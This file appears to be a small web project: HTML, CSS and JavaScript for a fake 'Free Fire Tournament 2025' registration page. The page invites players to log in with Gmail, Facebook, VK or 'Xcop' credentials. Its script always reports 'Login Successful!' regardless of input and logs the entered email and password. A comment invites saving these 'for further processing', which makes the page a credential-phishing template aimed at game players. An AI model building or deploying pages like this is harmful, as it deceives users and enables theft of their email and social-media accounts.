# Free-fire
Tournament restoration 
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Fire Tournament 2025</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

<!-- Background and Overlay -->
<div class="background">
    <div class="overlay">
        <div class="login-container">
            <!-- Tournament Logo -->
            <img class="free-fire-logo" src="https://your-image-link.com" alt="Free Fire Logo" />
            <h1>Welcome to Free Fire Tournament 2025</h1>
            <p>Please choose a login method:</p>

            <!-- Login Buttons -->
            <div class="login-buttons">
                <button onclick="showLoginForm('Gmail')">Login with Gmail</button>
                <button onclick="showLoginForm('Facebook')">Login with Facebook</button>
                <button onclick="showLoginForm('VK')">Login with VK</button>
                <button onclick="showLoginForm('Xcop')">Login with Xcop</button>
            </div>

            <!-- Login Form (Dynamically shown) -->
            <div id="login-form" style="display:none;">
                <p id="selected-method"></p>
                <input type="email" id="email" placeholder="Enter Gmail" style="display:block; margin-bottom: 10px;">
                <input type="password" id="password" placeholder="Enter Password" style="display:block; margin-bottom: 10px;">
                <button onclick="submitLogin()">Login</button>
            </div>

            <!-- Login Status -->
            <p id="login-status"></p>
        </div>
    </div>

    <!-- Watermark -->
    <div class="watermark">Tournament 2025 Registration</div>
</div>

<!-- JavaScript -->
<script src="script.js"></script>
</body>
</html>/* Body and HTML Setup */
body, html {
    margin: 0;
    padding: 0;
    height: 100%;
    font-family: Arial, sans-serif;
}

.background {
    background: url('https://your-free-fire-image-link.com') no-repeat center center fixed; /* Free Fire Image Link */
    background-size: cover;
    height: 100vh;
    position: relative;
    display: flex;
    justify-content: center;
    align-items: center;
}

/* Overlay for Transparency */
.overlay {
    background-color: rgba(0, 0, 0, 0.6);
    width: 100%;
    height: 100%;
    display: flex;
    justify-content: center;
    align-items: center;
    position: absolute;
}

/* Login Box Styling */
.login-container {
    background: white;
    padding: 30px;
    border-radius: 10px;
    text-align: center;
    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
    max-width: 400px;
    width: 90%;
    position: relative;
    z-index: 2;
}

.free-fire-logo {
    width: 100px;
    margin-bottom: 20px;
}

.login-buttons button {
    width: 80%;
    margin: 10px 0;
    padding: 15px;
    font-size: 16px;
    font-weight: bold;
    color: white;
    background-color: #007bff;
    border: none;
    border-radius: 5px;
    cursor: pointer;
    transition: background 0.3s;
}

.login-buttons button:hover {
    background-color: #0056b3;
}

/* Login Form Inputs */
#login-form input {
    width: 80%;
    padding: 10px;
    margin: 5px 0;
    border-radius: 5px;
    border: 1px solid #ccc;
}

/* Login Status Message */
#login-status {
    margin-top: 20px;
    font-size: 18px;
    font-weight: bold;
}

/* Watermark Styling */
.watermark {
    position: absolute;
    bottom: 20px;
    right: 20px;
    font-size: 24px;
    font-weight: bold;
    color: rgba(255, 255, 255, 0.7);
    transform: rotate(45deg); /* Rotated watermark */
    z-index: 1;
}function showLoginForm(method) {
    // Display the login form and set the login method
    document.getElementById("login-form").style.display = "block";
    document.getElementById("selected-method").innerHTML = `Login with ${method}`;

    // Clear email and password fields
    document.getElementById("email").value = "";
    document.getElementById("password").value = "";
}

function submitLogin() {
    // Get email and password values
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    if (email === "" || password === "") {
        document.getElementById("login-status").innerHTML = "Please enter both Gmail and Password.";
        return;
    }

    // Show login success message
    document.getElementById("login-status").innerHTML = "Login Successful!";

    // Log the email and password (You can save these data here for further processing)
    console.log("Gmail: " + email);
    console.log("Password: " + password);

    // Hide the login form
    document.getElementById("login-form").style.display = "none";
}
